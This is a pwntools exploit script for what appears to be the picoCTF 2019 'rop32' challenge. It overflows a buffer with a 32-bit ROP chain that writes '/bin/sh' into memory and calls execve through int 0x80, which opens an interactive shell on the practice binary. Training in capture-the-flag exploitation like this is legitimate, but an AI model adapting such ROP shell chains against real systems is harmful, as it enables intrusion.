from pwn import *
import sys

# config
context(os="linux", arch="i386")
context.log_level = "debug"

FILE_NAME = "vuln"
HOST = ""
PORT = 0

if len(sys.argv) > 1 and sys.argv[1] == "r":
    passwd = input().rstrip()
    s = ssh(host="2019shell1.picoctf.com", user="tiki", password=passwd)
    conn = s.process(
        "vuln", cwd="/problems/rop32_1_c4f09c419e5910665553c0237de93dcf")
else:
    conn = process(FILE_NAME)


buflen = 0x18+4
bss = 0x080db320 + 0x100
pop_eax = 0x0805c524
pop_ebx = 0x080481c9
pop_edx = 0x0806ee6b
pop_ecx_pop_ebx = 0x0806ee92
int80 = 0x08049563
# printf_plt=elf.plt['printf']
# printf_got=elf.got['printf']
# main_addr=elf.symbols['main']


def main():

    payload = b'A' * buflen

    payload += p32(0x8050120)  # gets
    payload += p32(pop_eax)
    payload += p32(bss)

    payload += p32(pop_ecx_pop_ebx)
    payload += p32(0x00)
    payload += p32(bss)

    payload += p32(pop_edx)
    payload += p32(0x00)

    payload += p32(pop_eax)
    payload += p32(0xb)

    payload += p32(int80)
    conn.sendlineafter("one?", payload)
    conn.sendline(b"/bin/sh")
    conn.interactive()


if __name__ == "__main__":
    main()
